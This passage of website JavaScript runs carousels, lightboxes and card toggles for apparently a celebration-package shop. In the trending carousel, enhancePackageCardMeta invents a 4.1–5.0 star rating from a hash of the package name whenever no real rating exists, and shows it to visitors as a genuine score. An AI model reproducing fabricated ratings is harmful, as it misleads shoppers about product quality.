        if (Math.abs(deltaX) < 42 || Math.abs(deltaX) < Math.abs(deltaY) * 1.25) {
          return;
        }
        if (deltaX < 0) {
          $lightboxSlider.carousel("next");
        } else {
          $lightboxSlider.carousel("prev");
        }
      }, { passive: true });

      lightboxSlider.addEventListener("touchcancel", function () {
        lightboxTouch.tracking = false;
      }, { passive: true });
    }

    bindLightboxSwipe();

    lightboxTriggers.forEach(function (trigger) {
      trigger.addEventListener("click", function (event) {
        event.preventDefault();
        var targetIndex = parseInt(trigger.getAttribute("data-testimonial-lightbox-index"), 10);
        if (isNaN(targetIndex)) {
          targetIndex = 0;
        }

        if (lightboxModal.classList.contains("show")) {
          $lightboxSlider.carousel(targetIndex);
          return;
        }

        $lightboxModal.one("shown.bs.modal", function () {
          $lightboxSlider.carousel(targetIndex);
        });
        $lightboxModal.modal("show");
      });
    });
  }

  function hideFlyAvatar() {
    if (!flyAvatar) {
      return;
    }
    flyAvatar.style.opacity = "0";
    flyAvatar.style.visibility = "hidden";
    flyAvatar.style.transform = "translate(-9999px, -9999px) scale(0.62)";
    flyAvatar.style.transition = "";
  }

  function hideMotionTrail() {
    if (!motionTrail) {
      return;
    }
    motionTrail.classList.remove("is-active");
  }

  function runFlyIn(direction, incomingSlide) {
    if (!box || !flyAvatar) {
      return;
    }

    var sourceBubble = direction === "left" ? rightBubble : leftBubble;
    if (!sourceBubble) {
      return;
    }

    setAvatarTone(flyAvatar, getAvatarToneFromSlide(incomingSlide));

    var sourceRect = sourceBubble.getBoundingClientRect();
    if (!sourceRect.width || !sourceRect.height) {
      return;
    }
    var activeAvatar = slider.querySelector(".carousel-item.active .client_img");
    if (!activeAvatar) {
      return;
    }
    var targetRect = activeAvatar.getBoundingClientRect();
    if (!targetRect.width || !targetRect.height) {
      return;
    }
    var boxRect = box.getBoundingClientRect();

    var startX = sourceRect.left - boxRect.left;
    var startY = sourceRect.top - boxRect.top;
    var endX = targetRect.left - boxRect.left;
    var endY = targetRect.top - boxRect.top;
    var deltaX = endX - startX;
    var deltaY = endY - startY;
    var midX = startX + deltaX * 0.56;
    var liftY = Math.max(42, Math.abs(deltaX) * 0.1);
    var midY = Math.min(startY, endY) - liftY;
    var overshootX = endX + (direction === "left" ? -8 : 8);

    if (flyAnimation) {
      flyAnimation.cancel();
      flyAnimation = null;
    }

    sourceBubble.style.setProperty("--suction-dx", deltaX + "px");
    sourceBubble.style.setProperty("--suction-dy", deltaY + "px");
    sourceBubble.classList.add("is-launching");

    if (motionTrail) {
      var trailX = startX + sourceRect.width * 0.5;
      var trailY = startY + sourceRect.height * 0.5 - 4;
      var trailAngle = Math.atan2(deltaY, deltaX) * 180 / Math.PI;
      var trailLength = Math.max(14, Math.hypot(deltaX, deltaY));
      motionTrail.classList.remove("is-active");
      motionTrail.style.setProperty("--trail-x", trailX + "px");
      motionTrail.style.setProperty("--trail-y", trailY + "px");
      motionTrail.style.setProperty("--trail-angle", trailAngle + "deg");
      motionTrail.style.setProperty("--trail-length", trailLength + "px");
      void motionTrail.offsetWidth;
      motionTrail.classList.add("is-active");
    }

    flyAvatar.style.visibility = "visible";
    flyAvatar.style.opacity = "1";
    flyAvatar.style.transition = "";
    flyAvatar.style.transform = "translate(" + startX + "px, " + startY + "px) scale(0.62) rotate(" + (direction === "left" ? "-8deg" : "8deg") + ")";

    function cleanupFlyState() {
      sourceBubble.classList.remove("is-launching");
      sourceBubble.style.removeProperty("--suction-dx");
      sourceBubble.style.removeProperty("--suction-dy");
      hideMotionTrail();
      hideFlyAvatar();
      flyAnimation = null;
    }

    if (typeof flyAvatar.animate === "function") {
      flyAnimation = flyAvatar.animate(
        [
          {
            transform: "translate(" + startX + "px, " + startY + "px) scale(0.62) rotate(" + (direction === "left" ? "-8deg" : "8deg") + ")",
            opacity: 0.96,
            filter: "blur(0px) saturate(1.06)"
          },
          {
            offset: 0.52,
            transform: "translate(" + midX + "px, " + midY + "px) scale(0.34) rotate(" + (direction === "left" ? "-3deg" : "3deg") + ")",
            opacity: 0.84,
            filter: "blur(1.2px) saturate(0.9)"
          },
          {
            offset: 0.7,
            transform: "translate(" + endX + "px, " + endY + "px) scale(0.08) rotate(0deg)",
            opacity: 0.28,
            filter: "blur(2.8px) saturate(0.78)"
          },
          {
            offset: 0.82,
            transform: "translate(" + overshootX + "px, " + (endY - 5) + "px) scale(1.24) rotate(0deg)",
            opacity: 1,
            filter: "blur(0px) saturate(1)"
          },
          {
            transform: "translate(" + endX + "px, " + endY + "px) scale(1) rotate(0deg)",
            opacity: 1,
            filter: "blur(0px) saturate(1)"
          }
        ],
        {
          duration: 860,
          easing: "cubic-bezier(0.16, 1, 0.3, 1)",
          fill: "forwards"
        }
      );

      flyAnimation.onfinish = cleanupFlyState;
      flyAnimation.oncancel = cleanupFlyState;
      return;
    }

    flyAvatar.style.transition = "transform 860ms cubic-bezier(0.16, 1, 0.3, 1), opacity 860ms ease";
    requestAnimationFrame(function () {
      flyAvatar.style.transform = "translate(" + endX + "px, " + endY + "px) scale(1) rotate(0deg)";
      flyAvatar.style.opacity = "1";
    });

    setTimeout(function () {
      cleanupFlyState();
    }, 900);
  }

  syncBubbleAvatarsFromActive();
  syncMerabellStrip();
  bindMerabellStripProgress();
  initMerabellLightbox();
  hideMotionTrail();
  hideFlyAvatar();

  $slider.on("slide.bs.carousel", function (event) {
    runFlyIn(event.direction, event.relatedTarget);
  });

  $slider.on("slid.bs.carousel", function () {
    syncBubbleAvatarsFromActive();
    syncMerabellStrip();
  });

  var prevBtn = slider.querySelector(".carousel-control-prev");
  var nextBtn = slider.querySelector(".carousel-control-next");

  if (prevBtn) {
    prevBtn.addEventListener("click", function (event) {
      event.preventDefault();
      event.stopPropagation();
      $slider.carousel("prev");
    });
  }

  if (nextBtn) {
    nextBtn.addEventListener("click", function (event) {
      event.preventDefault();
      event.stopPropagation();
      $slider.carousel("next");
    });
  }
}

if (document.readyState === "loading") {
  document.addEventListener("DOMContentLoaded", initHomeTestimonialCarousel);
} else {
  initHomeTestimonialCarousel();
}

function initHomePackageLightbox() {
  if (typeof window.jQuery === "undefined") {
    return;
  }

  var modal = document.getElementById("package_lightbox");
  var slider = document.getElementById("package_lightbox_slider");
  var sliderInner = slider ? slider.querySelector(".carousel-inner") : null;
  var modalTitle = modal ? modal.querySelector("#package_lightbox_title") : null;
  var triggers = Array.prototype.slice.call(document.querySelectorAll(".home-package-lightbox-trigger[data-package-key]"));

  if (!modal || !slider || !sliderInner || !triggers.length) {
    return;
  }

  if (modal.dataset.lightboxBound === "true") {
    return;
  }
  modal.dataset.lightboxBound = "true";

  var $modal = window.jQuery(modal);
  var $slider = window.jQuery(slider);

  $slider.carousel({
    interval: false,
    ride: false,
    pause: true,
    wrap: true
  });

  var packageGalleryMap = {
    birthday: {
      title: "Birthday Bliss",
      images: [
        { src: "images/birthday_demo.jpg", alt: "Birthday Bliss package full image one" },
        { src: "images/bday_demo.png", alt: "Birthday Bliss package full image two" },
        { src: "images/workplace_bday1.jpg", alt: "Birthday Bliss package full image three" }
      ]
    },
    anniversary: {
      title: "Anniversary Glow",
      images: [
        { src: "images/anniversary_demo.jpeg", alt: "Anniversary Glow package full image one" },
        { src: "images/prop-2hearts.png", alt: "Anniversary Glow package full image two" },
        { src: "images/val_1.jpg", alt: "Anniversary Glow package full image three" }
      ]
    },
    festival: {
      title: "Festival Magic Set",
      images: [
        { src: "images/christmas_demo.jpeg", alt: "Festival Magic Set package full image one" },
        { src: "images/festive1.jpeg", alt: "Festival Magic Set package full image two" },
        { src: "images/festive2.jpeg", alt: "Festival Magic Set package full image three" }
      ]
    }
  };

  function renderPackageSlides(packageKey, targetIndex) {
    var packageData = packageGalleryMap[packageKey];
    if (!packageData || !packageData.images || !packageData.images.length) {
      return false;
    }

    sliderInner.innerHTML = "";

    packageData.images.forEach(function (imageData, index) {
      var item = document.createElement("div");
      item.className = "carousel-item" + (index === targetIndex ? " active" : "");

      var image = document.createElement("img");
      image.className = "d-block w-100";
      image.src = imageData.src;
      image.alt = imageData.alt;

      item.appendChild(image);
      sliderInner.appendChild(item);
    });

    if (modalTitle) {
      modalTitle.textContent = packageData.title;
    }

    return true;
  }

  triggers.forEach(function (trigger) {
    trigger.addEventListener("click", function (event) {
      event.preventDefault();

      var packageKey = trigger.getAttribute("data-package-key") || "";
      var rendered = renderPackageSlides(packageKey, 0);
      if (!rendered) {
        return;
      }

      if (modal.classList.contains("show")) {
        $slider.carousel(0);
        return;
      }

      $modal.one("shown.bs.modal", function () {
        $slider.carousel(0);
      });
      $modal.modal("show");
    });
  });
}

if (document.readyState === "loading") {
  document.addEventListener("DOMContentLoaded", initHomePackageLightbox);
} else {
  initHomePackageLightbox();
}

function initHomeTrendingCarousel() {
  var root = document.querySelector("[data-home-trending]");
  if (!root) {
    return;
  }

  var track = root.querySelector("[data-trending-track]");
  var prevButton = root.querySelector("[data-trending-prev]");
  var nextButton = root.querySelector("[data-trending-next]");
  var progress = root.querySelector("[data-trending-progress]");

  if (!track || !progress) {
    return;
  }

  var cards = Array.prototype.slice.call(track.querySelectorAll(".home-trending-card"));
  if (!cards.length) {
    return;
  }

  var autoTimer = null;
  var resumeTimer = null;
  var activeIndex = 0;
  var currentMonth = new Date().getMonth();

  var seasonalKeywords = [
    ["new-year", "winter", "january"],
    ["valentine", "romance", "february"],
    ["spring", "easter", "march"],
    ["spring", "easter", "april"],
    ["summer", "birthday", "may"],
    ["summer", "birthday", "june"],
    ["summer", "birthday", "july"],
    ["summer", "birthday", "august"],
    ["autumn", "anniversary", "september"],
    ["autumn", "anniversary", "october"],
    ["autumn", "anniversary", "november"],
    ["christmas", "festive", "december"]
  ][currentMonth] || [];

  cards
    .map(function (card, index) {
      var seasons = (card.getAttribute("data-season") || "").toLowerCase();
      var score = seasonalKeywords.reduce(function (total, keyword) {
        return total + (seasons.indexOf(keyword) !== -1 ? 1 : 0);
      }, 0);

      return {
        card: card,
        index: index,
        score: score
      };
    })
    .sort(function (a, b) {
      if (b.score !== a.score) {
        return b.score - a.score;
      }

      return a.index - b.index;
    })
    .forEach(function (item) {
      track.appendChild(item.card);
    });

  cards = Array.prototype.slice.call(track.querySelectorAll(".home-trending-card"));

  function hashTrendingString(value) {
    var text = (value || "").toString();
    var hash = 0;
    var index = 0;

    for (index = 0; index < text.length; index += 1) {
      hash = ((hash << 5) - hash) + text.charCodeAt(index);
      hash |= 0;
    }

    return Math.abs(hash);
  }

  function buildRatingStars(score) {
    var numericRating = Number(score);
    var starsHtml = "";
    var starIndex = 0;

    if (!Number.isFinite(numericRating)) {
      numericRating = 4.8;
    }

    numericRating = Math.max(0, Math.min(5, numericRating));

    for (starIndex = 0; starIndex < 5; starIndex += 1) {
      var starFill = Math.max(0, Math.min(1, numericRating - starIndex));
      starsHtml +=
        '<span class="package-rating-star">' +
          '<i class="fa fa-star-o" aria-hidden="true"></i>' +
          '<span class="package-rating-star-fill" style="width:' + (starFill * 100).toFixed(2) + '%;">' +
            '<i class="fa fa-star" aria-hidden="true"></i>' +
          '</span>' +
        '</span>';
    }

    return {
      label: numericRating.toFixed(1),
      html: starsHtml
    };
  }

  function enhancePackageCardMeta() {
    cards.forEach(function (card, index) {
      var topRow = card.querySelector(".package-card-top");
      var priceTag = topRow ? topRow.querySelector(".package-price") : null;
      var rating = card.querySelector(".package-rating");
      var ratingScore = card.getAttribute("data-package-rating");

      if (!topRow || !priceTag) {
        return;
      }

      if (!rating) {
        if (!ratingScore) {
          ratingScore = (4.1 + ((hashTrendingString((card.getAttribute("data-package-id") || card.getAttribute("data-package-name") || String(index)) + "|rating") % 2401) / 2400) * 0.9).toFixed(1);
          card.setAttribute("data-package-rating", ratingScore);
        }

        var ratingStars = buildRatingStars(ratingScore);
        rating = document.createElement("div");
        rating.className = "package-rating";
        rating.setAttribute("aria-label", ratingStars.label + " out of 5 stars");
        rating.innerHTML =
          '<span class="package-rating-stars" aria-hidden="true">' +
            ratingStars.html +
          '</span>' +
          '<span>' + ratingStars.label + '</span>';
      }

      if (!card.querySelector(".package-meta-grid")) {
        var metaGrid = document.createElement("div");
        metaGrid.className = "package-meta-grid";
        topRow.insertAdjacentElement("afterend", metaGrid);
        metaGrid.appendChild(priceTag);
        metaGrid.appendChild(rating);
      }
    });
  }

  function buildProgress() {
    progress.innerHTML = "";

    cards.forEach(function (_card, index) {
      var dot = document.createElement("button");
      dot.type = "button";
      dot.setAttribute("aria-label", "Show trending package " + (index + 1));
      dot.addEventListener("click", function () {
        pauseAuto();
        scrollToCard(index);
        scheduleResume();
      });
      progress.appendChild(dot);
    });
  }

  function getCardLeft(index) {
    var target = cards[index];
    if (!target) {
      return 0;
    }

    return target.offsetLeft - track.offsetLeft;
  }

  function scrollToCard(index) {
    if (!cards.length) {
      return;
    }

    activeIndex = (index + cards.length) % cards.length;
    track.scrollTo({
      left: getCardLeft(activeIndex),
      behavior: "smooth"
    });
    updateProgress(activeIndex);
  }

  function getNearestIndex() {
    var nearestIndex = 0;
    var nearestDistance = Infinity;

    cards.forEach(function (card, index) {
      var distance = Math.abs((card.offsetLeft - track.offsetLeft) - track.scrollLeft);
      if (distance < nearestDistance) {
        nearestDistance = distance;
        nearestIndex = index;
      }
    });

    return nearestIndex;
  }

  function updateProgress(index) {
    var dots = Array.prototype.slice.call(progress.querySelectorAll("button"));

    dots.forEach(function (dot, dotIndex) {
      var isActive = dotIndex === index;
      dot.classList.toggle("is-active", isActive);
      dot.setAttribute("aria-current", isActive ? "true" : "false");
    });
  }

  function goNext() {
    scrollToCard(activeIndex + 1);
  }

  function goPrevious() {
    scrollToCard(activeIndex - 1);
  }

  function pauseAuto() {
    if (autoTimer) {
      clearInterval(autoTimer);
      autoTimer = null;
    }
    if (resumeTimer) {
      clearTimeout(resumeTimer);
      resumeTimer = null;
    }
  }

  function startAuto() {
    pauseAuto();
    autoTimer = setInterval(goNext, 3600);
  }

  function scheduleResume() {
    if (resumeTimer) {
      clearTimeout(resumeTimer);
    }
    resumeTimer = setTimeout(startAuto, 5200);
  }

  var scrollTicking = false;
  track.addEventListener("scroll", function () {
    if (scrollTicking) {
      return;
    }

    scrollTicking = true;
    window.requestAnimationFrame(function () {
      activeIndex = getNearestIndex();
      updateProgress(activeIndex);
      scrollTicking = false;
    });
  });

  ["pointerdown", "touchstart", "focusin"].forEach(function (eventName) {
    track.addEventListener(eventName, pauseAuto, { passive: true });
  });

  ["pointerup", "touchend", "focusout"].forEach(function (eventName) {
    track.addEventListener(eventName, scheduleResume, { passive: true });
  });

  if (prevButton) {
    prevButton.addEventListener("click", function () {
      pauseAuto();
      goPrevious();
      scheduleResume();
    });
  }

  if (nextButton) {
    nextButton.addEventListener("click", function () {
      pauseAuto();
      goNext();
      scheduleResume();
    });
  }

  enhancePackageCardMeta();
  buildProgress();
  updateProgress(0);
  startAuto();
}

if (document.readyState === "loading") {
  document.addEventListener("DOMContentLoaded", initHomeTrendingCarousel);
} else {
  initHomeTrendingCarousel();
}

(function initBlogCardToggles(document) {
  "use strict";

  function init() {
    var toggles = document.querySelectorAll("[data-blog-toggle]");
    if (!toggles.length) {
      return;
    }

    toggles.forEach(function (toggle) {
      var targetId = toggle.getAttribute("aria-controls");
      var details = targetId ? document.getElementById(targetId) : null;
      if (!details) {
        return;
      }

      toggle.addEventListener("click", function () {
        var isExpanded = toggle.getAttribute("aria-expanded") === "true";
        toggle.setAttribute("aria-expanded", isExpanded ? "false" : "true");
        toggle.textContent = isExpanded ? "Read more" : "Show less";
        details.hidden = isExpanded;
      });
    });
  }

  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", init);
  } else {
    init();
  }
})(document);

